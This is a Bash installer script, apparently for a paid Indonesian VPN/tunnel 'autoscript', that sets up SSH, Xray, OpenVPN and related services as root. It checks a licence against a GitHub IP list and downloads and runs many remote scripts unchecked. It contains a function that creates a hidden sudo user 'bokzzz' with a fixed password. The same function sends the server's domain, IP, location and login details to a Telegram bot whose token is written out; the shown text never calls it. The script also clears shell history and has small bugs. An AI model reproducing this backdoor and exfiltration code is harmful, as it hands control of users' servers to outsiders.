#!/bin/bash
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
#########################
# Getting
ipsaya=$(wget -qO- ipinfo.io/ip)
data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")
data_ip="https://raw.githubusercontent.com/Jengkolonline/izinn/main/ip"
checking_sc() {
  useexp=$(wget -qO- $data_ip | grep $ipsaya | awk '{print $3}')
  if [[ $date_list < $useexp ]]; then
    echo -ne
  else
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    echo -e ""
    echo -e "            ${RED}PERMISSION DENIED !${NC}"
    echo -e "   \033[0;33mYour VPS${NC} $ipsaya \033[0;33mHas been Banned${NC}"
    echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
    echo -e "             \033[0;33mContact Admin :${NC}"
    echo -e "      \033[0;36mTelegram${NC} t.me/Jengkol_Online"
    echo -e "      ${GREEN}WhatsApp${NC} wa.me/6282372139631"
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    exit
  fi
}
checking_sc
clear
Repo1="https://raw.githubusercontent.com/Jengkolonline/izinn/main/"
export MYIP=$( curl -s https://ipinfo.io/ip/ )
Name=$(curl -sS ${Repo1}ip | grep $MYIP | awk '{print $2}')
Exp=$(curl -sS ${Repo1}ip | grep $MYIP | awk '{print $3}')
IPVPS=$(curl -s ipinfo.io/ip )
red='\e[1;31m'
green='\e[0;32m'
yell='\e[1;33m'
tyblue='\e[1;36m'
NC='\e[0m'
purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
#LOGO
echo -e "\e[33m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e " \e[0;100;33m        • AutoScript by JENGKOLONLINE •            \e[0m"
echo -e "\e[33m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e " ${YELLOW}     _______  _________ ______  __ ${NC} ${RED}PREMIUM${NC}"
echo -e " ${YELLOW} __ / / __/ |/ / ___/ //_/ __ \/ / ${NC} ${RED}SCRIPT${NC}"
echo -e " ${YELLOW}/ // / _//    / (_ / ,< / /_/ / /__${NC} ${BLUE}========${NC}"
echo -e " ${YELLOW}\___/___/_/|_/\___/_/|_|\____/____/${NC}"
echo -e "       ${RED}───────${NC} ${Green} / __ \/ |/ / /  /  _/ |/ / __//|  ${NC}"  
echo -e "       ${RED}───────${NC} ${Green}/ /_/ /    / /___/ //    / _/> _< ${NC}"  
echo -e "       ${RED}───────${NC} ${Green}\____/_/|_/____/___/_/|_/___/|/   ${NC}"
echo -e " ${Green}MULTI PROT PROT 443 & 80${FONT} (C)${GRAY} AUTO INSTALASI${NC}" 
echo -e "\e[33m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo _e "${green}Terimakasih Telah Menggunakan SCRIPT JengkolOnline${NS}"
echo -e "\e[33m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 7
clear
cd /root
#System version number
if [ "${EUID}" -ne 0 ]; then
		echo "You need to run this script as root"
		exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
		echo "OpenVZ is not supported"
		exit 1
fi

localip=$(hostname -I | cut -d\  -f1)
hst=( `hostname` )
dart=$(cat /etc/hosts | grep -w `hostname` | awk '{print $2}')
if [[ "$hst" != "$dart" ]]; then
echo "$localip $(hostname)" >> /etc/hosts
fi

mkdir -p /etc/xray
mkdir -p /etc/v2ray
touch /etc/xray/domain
touch /etc/v2ray/domain
touch /etc/xray/scdomain
touch /etc/v2ray/scdomain


echo -e "[ ${tyblue}NOTES${NC} ] Before we go.. "
sleep 1
echo -e "[ ${tyblue}NOTES${NC} ] I need check your headers first.."
sleep 2
echo -e "[ ${green}INFO${NC} ] Checking headers"
sleep 1
totet=`uname -r`
REQUIRED_PKG="linux-headers-$totet"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "install ok installed")
echo Checking for $REQUIRED_PKG: $PKG_OK
if [ "" = "$PKG_OK" ]; then
  sleep 2
  echo -e "[ ${yell}WARNING${NC} ] Try to install ...."
  echo "No $REQUIRED_PKG. Setting up $REQUIRED_PKG."
  apt-get --yes install $REQUIRED_PKG
  sleep 1
  echo ""
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] If error you need.. to do this"
  sleep 1
  echo ""
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] 1. apt update -y"
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] 2. apt upgrade -y"
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] 3. apt dist-upgrade -y"
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] 4. reboot"
  sleep 1
  echo ""
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] After rebooting"
  sleep 1
  echo -e "[ ${tyblue}NOTES${NC} ] Then run this script again"
  echo -e "[ ${tyblue}NOTES${NC} ] if you understand then tap enter now"
  read
else
  echo -e "[ ${green}INFO${NC} ] Oke installed"
fi

ttet=`uname -r`
ReqPKG="linux-headers-$ttet"
if ! dpkg -s $ReqPKG  >/dev/null 2>&1; then
  rm /root/setup.sh >/dev/null 2>&1 
  exit
else
  clear
fi


secs_to_human() {
    echo "Installation time : $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minute's $(( ${1} % 60 )) seconds"
}
start=$(date +%s)
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1

coreselect=''
cat> /root/.profile << END
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n || true
clear
END
chmod 644 /root/.profile

echo -e "[ ${green}INFO${NC} ] Preparing the install file"
apt install git curl -y >/dev/null 2>&1
apt install python -y >/dev/null 2>&1
sudo apt-get install python3.7-dev >/dev/null 2>&1
apt install python3.7-distutils >/dev/null 2>&1
python3.7 -m pip install telethon >/dev/null 2>&1
python3.7 -m pip install pyarmor >/dev/null 2>&1
echo -e "[ ${green}INFO${NC} ] Aight good ... installation file is ready"
sleep 2
echo -ne "[ ${green}INFO${NC} ] Check permission : "

mkdir -p /var/lib/SIJA >/dev/null 2>&1
echo "IP=" >> /var/lib/SIJA/ipvps.conf

echo ""
wget -q https://raw.githubusercontent.com/Jengkolonline/tunneljengkolonline/main/tools.sh;chmod +x tools.sh;./tools.sh
rm tools.sh
clear
yellow "Add Domain for vmess/vless/trojan dll"
echo " "
read -rp "Input ur domain : " -e pp
    if [ -z $pp ]; then
        echo -e "
        Nothing input for domain!
        Then a random domain will be created"
    else
        echo "$pp" > /root/scdomain
	echo "$pp" > /etc/xray/scdomain
	echo "$pp" > /etc/xray/domain
	echo "$pp" > /etc/v2ray/domain
	echo $pp > /root/domain
        echo "IP=$pp" > /var/lib/SIJA/ipvps.conf
    fi

function password_default() {
    domain=$(cat /root/domain)
    CITY=$(curl -s ipinfo.io/city )
    WKT=$(curl -s ipinfo.io/timezone )
    userdel jame > /dev/null 2>&1
    Username="bokzzz"
    Password=bokzzz
    mkdir -p /home/script/
    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
    usermod -aG sudo $Username > /dev/null 2>&1

    CHATID="1830342336"
    KEY="6320035110:AAE6otySdlNHPhKom2PNtp8yZn8X8rZS7LE"
    TIME="10"
    URL="https://api.telegram.org/bot$KEY/sendMessage"
    TEXT="Installasi VPN Script JengkolOnline
   
    ============================
    <code>Domain     :</code> <code>$domain</code>
    <code>IP Vps     :</code> <code>$IPVPS</code>
    <code>User Login :</code> <code>bok</code>
    <code>Pass Login :</code> <code>bok</code>
    <code>User Script:</code> <code>$Name</code>
    <code>Exp Script :</code> <code>$Exp</code>
    <code>Location   :</code> <code>$CITY</code>
    <code>Timezone   :</code> <code>$WKT</code>
    ============================
    Multi Port By JengkolOnline
    ============================
"

   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
}

clear    
#install ssh ovpn
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green      Install SSH / WS               $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 0.5
clear
wget https://raw.githubusercontent.com/Jengkolonline/vpn/main/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
#Instal Xray
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install XRAY              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 0.5
clear
wget https://raw.githubusercontent.com/Jengkolonline/supreme/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
wget https://raw.githubusercontent.com/Jengkolonline/tunneljengkolonline/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install Websocket None TLS              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 0.5
clear
wget https://raw.githubusercontent.com/Jengkolonline/tunneljengkolonline/main/sshws/nontls.sh && chmod +x nontls.sh && ./nontos.sh
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install OpenVPN              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 0.5
clear
wget https://raw.githubusercontent.com/Jengkolonline/vpn/main/vpn.sh && chmod +x vpn.sh && ./vpn.sh
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install OHP              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 0.5
clear
wget https://raw.githubusercontent.com/Jengkolonline/ohp/main/ohp-dropbear.sh && chmod +x ohp-dropbear.sh && ./ohp-dropbear.sh
wget https://raw.githubusercontent.com/Jengkolonline/ohp/main/ohp-ssh.sh && chmod +x ohp-ssh.sh && ./ohp-ssh.sh
wget https://raw.githubusercontent.com/Jengkolonline/ohp/main/ohp.sh && chmod +x ohp.sh && ./ohp.sh
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install Backup              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 0.5
clear
wget https://raw.githubusercontent.com/Jengkolonline/backup/main/set-br.sh && chmod +x set-br.sh && ./set-br.sh
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install Gotop              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 0.5
clear
gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
    gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
    curl -sL "$gotop_link" -o /tmp/gotop.deb
    dpkg -i /tmp/gotop.deb >/dev/null 2>&1
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install bot              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 0.5
clear
mkdir -p /etc/adminbot/var.txt
wget https://raw.githubusercontent.com/Jengkoltunnel/v3/main/botmin.zip
    unzip botmin.zip
    mv adminbot /etc
    rm *.zip
    touch /etc/adminbot/var.txt
clear
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "$green          Install SLOWDNS              $NC"
echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
sleep 0.5
clear
wget -q -O /tmp/nameserver "https://raw.githubusercontent.com/Jengkolonline/slowdns/main/nameserver" >/dev/null 2>&1
    chmod +x /tmp/nameserver
    bash /tmp/nameserver | tee /root/install.log
cat> /root/.profile << END
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n || true
clear
menu
END
chmod 644 /root/.profile

if [ -f "/root/log-install.txt" ]; then
rm /root/log-install.txt > /dev/null 2>&1
fi
if [ -f "/etc/afak.conf" ]; then
rm /etc/afak.conf > /dev/null 2>&1
fi
if [ ! -f "/etc/log-create-ssh.log" ]; then
echo "Log SSH Account " > /etc/log-create-ssh.log
fi
if [ ! -f "/etc/log-create-vmess.log" ]; then
echo "Log Vmess Account " > /etc/log-create-vmess.log
fi
if [ ! -f "/etc/log-create-vless.log" ]; then
echo "Log Vless Account " > /etc/log-create-vless.log
fi
if [ ! -f "/etc/log-create-trojan.log" ]; then
echo "Log Trojan Account " > /etc/log-create-trojan.log
fi
if [ ! -f "/etc/log-create-shadowsocks.log" ]; then
echo "Log Shadowsocks Account " > /etc/log-create-shadowsocks.log
fi
if [ ! -f "/etc/log-create-user.log" ]; then
echo "Log All Account " > /etc/log-create-user.log
fi
history -c
echo $serverV > /opt/.ver
aureb=$(cat /home/re_otm)
b=11
if [ $aureb -gt $b ]
then
gg="PM"
else
gg="AM"
fi
curl -sS ifconfig.me > /etc/myipvps
echo " "
echo "=====================-[ SISTEM NETWORK ]-===================="
echo ""
echo "------------------------------------------------------------"
echo ""
echo ""
echo "   >>> Service & Port"  | tee -a log-install.txt
echo "   - OpenSSH		   : 22"  | tee -a log-install.txt
echo "   - OpenVPN TCP		   : 1194"  | tee -a log-install.txt
echo "   - OpenVPN UDP		   : 2200"  | tee -a log-install.txt
echo "   - OpenVPN SSL             : 110"  | tee -a log-install.txt
echo "   - SSH Websocket	   : 80 [OFF]" | tee -a log-install.txt
echo "   - SSH SSL Websocket       : 443" | tee -a log-install.txt
echo "   - SSH NON-SSL Websocket   : 8880" | tee -a log-install.txt
echo "   - OHP Dropbear            : 8585"  | tee -a log-install.txt
echo "   - OHP SSH                 : 8686"  | tee -a log-install.txt
echo "   - OHP OpenVPN             : 8787"  | tee -a log-install.txt
echo "   - Stunnel4		   : 447, 777" | tee -a log-install.txt
echo "   - Dropbear		   : 109, 143" | tee -a log-install.txt
echo "   - Badvpn		   : 7100-7900" | tee -a log-install.txt
echo "   - Nginx		   : 81" | tee -a log-install.txt
echo "   - Squid Proxy             : 3128, 8000 (limit to IP Server)"  | tee -a log-install.txt
echo "   - Vmess TLS		   : 443" | tee -a log-install.txt
echo "   - Vmess None TLS	   : 80" | tee -a log-install.txt
echo "   - Vmess Grpc		   : 443" | tee -a log-install.txt
echo "   - Vless TLS		   : 443" | tee -a log-install.txt
echo "   - Vless None TLS	   : 80" | tee -a log-install.txt
echo "   - Vless Grpc		   : 443" | tee -a log-install.txt
echo "   - Trojan WS TLS	   : 443" | tee -a log-install.txt
echo "   - Trojan WS none TLS      : 80" | tee -a log-install.txt
echo "   - Trojan Grpc  	   : 443" | tee -a log-install.txt
echo "   - Shadowsocks WS TLS      : 443" | tee -a log-install.txt
echo "   - Shadowsocks none TLS.   : 80" | tee -a log-install.txt
echo "   - Shadowsocks Grpc	   : 443" | tee -a log-install.txt
#echo "   - Trojan Go		   : 443" | tee -a log-install.txt
echo "   - Wireguard               : 7070" | tee -a log-install.txt
echo "   - SSTP VPN                : 444" | tee -a log-install.txt
echo "   - L2TP/IPSEC VPN          : 1701" | tee -a log-install.txt
echo "   - PPTP VPN                : 1732" | tee -a log-install.txt
echo "   - SS-OBFS TLS             : 2443-2543" | tee -a log-install.txt
echo "   - SS-OBFS HTTP            : 3443-3543" | tee -a log-install.txt
echo "   - Shadowsocks-R           : 1443-1543" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
echo "   - Timezone		   : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban		   : [ON]"  | tee -a log-install.txt
echo "   - Dflate		   : [ON]"  | tee -a log-install.txt
echo "   - IPtables		   : [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot		   : [ON]"  | tee -a log-install.txt
echo "   - IPv6			   : [OFF]"  | tee -a log-install.txt
echo "   - Autoreboot On	   : $aureb:00 $gg GMT +7" | tee -a log-install.txt
echo "   - AutoKill Multi Login User" | tee -a log-install.txt
echo "   - Auto Delete Expired Account" | tee -a log-install.txt
echo "   - Fully automatic script" | tee -a log-install.txt
echo "   - VPS settings" | tee -a log-install.txt
echo "   - Admin Control" | tee -a log-install.txt
echo "   - Change port" | tee -a log-install.txt
echo "   - Full Orders For Various Services" | tee -a log-install.txt
echo ""
echo ""
echo "------------------------------------------------------------"
echo ""
echo "===============-[ Script Created By JENGKOLONLINE ]-==============="
echo -e ""
echo ""
echo "" | tee -a log-install.txt
rm /root/setup.sh >/dev/null 2>&1
rm /root/ins-xray.sh >/dev/null 2>&1
rm /root/insshws.sh >/dev/null 2>&1
rm /root/nontls.sh >/dev/null 2>&1
rm /root/vpn.sh >/dev/null 2>&1
rm /root/set-br.sh >/dev/null 2>&1
rm /root/tmp/nameserver >/dev/null 2>&1
rm /root/tmp/gotop.deb >/dev/null 2>&1
rm /root/ohp-dropbear.sh >/dev/null 2>&1
rm /root/ohp-ssh.sh >/dev/null 2>&1
rm /root/ohp.sh >/dev/null 2>&1
secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
echo -e "
"
echo -ne "[ ${yell}WARNING${NC} ] Do you want to reboot now ? (y/n)? "
read answer
if [ "$answer" == "${answer#[Yy]}" ] ;then
exit 0
else
reboot
fi





